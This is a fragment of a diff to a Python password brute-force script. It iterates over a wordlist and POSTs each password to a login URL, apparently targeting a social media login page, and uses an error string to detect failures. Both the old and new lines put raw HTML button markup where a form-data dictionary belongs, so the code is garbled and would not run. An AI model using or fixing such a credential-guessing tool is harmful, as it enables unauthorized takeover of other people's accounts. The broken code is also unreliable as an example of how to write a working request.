@@ -7,7 +7,7 @@ try:
         for password in passwords:
             password = password.strip()
             print("Trying:" + password)
-            data_dict = {<button class="sqdOP  L3NKy   y3zKF     " type="submit"><div class="             qF0y9          Igw0E     IwRSH      eGOV_       acqo5   _4EzTm                                                                                                              ">Log In</div></button>}
+            data_dict = {<button class="_acan _acap _acas" disabled="" type="submit"><div class="_ab8w  _ab94 _ab99 _ab9f _ab9m _ab9p">Log in</div></button>}
             response = requests.post(url, data=data_dict)
             if error in str(response.content):
                pass
